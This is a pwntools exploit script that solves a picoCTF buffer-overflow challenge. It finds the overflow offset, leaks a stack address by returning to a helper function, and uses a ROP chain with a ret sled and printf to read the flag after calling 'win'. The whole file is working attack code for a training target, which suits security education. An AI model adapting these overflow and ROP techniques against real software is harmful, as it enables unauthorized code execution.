#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 63957 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 63957)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

def send_payload(proc, payload):
    proc.sendlineafter(b"Give me a string that gets you the flag", payload)

proc = process(exe.path)

payload = cyclic(100, n=exe.bytes)
send_payload(proc, payload)
proc.wait()
overflow_offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
log.info("Overflow offset: %i", overflow_offset)
# overflow_offset = 14

io = start()
# Return to `UnderConstruction` to get the stack location and then return back to
# vuln` so we can continue to exploit the program.
payload = fit({overflow_offset: p32(
    exe.symbols["UnderConstruction"]) + p32(exe.symbols["vuln"])})

log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)

# Get the stack location address
data = io.recvline_contains(b"User information : ")
stack_location = int(data.split(b" ")[8], 16)
log.info("Got stack location 0x%x", stack_location)

# Create a basic rop chain to print values from the stack slightly before the retrieved
# stack location. `0x20` was found by guessing
rop = ROP(exe)
rop.printf(stack_location-0x20)
rop.exit()
log.info("Created ROP payload: \n{}".format(rop.dump()))

rop_ret_address = 0x0804900e
# Create the final exploit payload which will return to the `win` function so that the
# flag gets placed on the stack. Then, we pad out our rop chain with "ret" gadgets to
# give more room in case the offset is wrong.
payload = fit({
    overflow_offset:
    p32(exe.symbols["win"]) + p32(rop_ret_address) * 50 + rop.chain()
})
log.info("Sending payload: \n{}".format(hexdump(payload)))
send_payload(io, payload)

output = io.recvuntil(b"}")

flag = re.search("picoCTF{.*?}", output.decode("ascii", errors="ignore")).group()
log.success("Flag %s", flag)
